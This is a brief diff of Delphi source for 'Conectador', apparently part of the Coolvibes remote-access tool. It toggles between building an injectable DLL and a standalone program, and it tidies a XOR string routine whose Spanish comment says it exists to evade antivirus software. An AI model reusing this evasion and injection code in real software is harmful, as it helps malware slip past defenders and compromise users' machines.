@@ -11,8 +11,8 @@
 
      El equipo Coolvibes
 *)
-library Conectador; //Para inyectar descomentar
-//program Conectador; //Para no inyectar descomentar
+//library Conectador; //Para inyectar descomentar
+program Conectador; //Para no inyectar descomentar
 
 uses
   Windows,
@@ -53,9 +53,7 @@ var
   iloop: Integer;
 begin
   for iloop := 1 to Length(Text) do
-    begin
-      Text[iloop] := chr(Ord(Text[iloop]) xor i); //Funcion de cifrado simple para evadir antiviruses
-    end;
+    Text[iloop] := chr(Ord(Text[iloop]) xor i); //Funcion de cifrado simple para evadir antiviruses
   Result := Text;
 end;
 
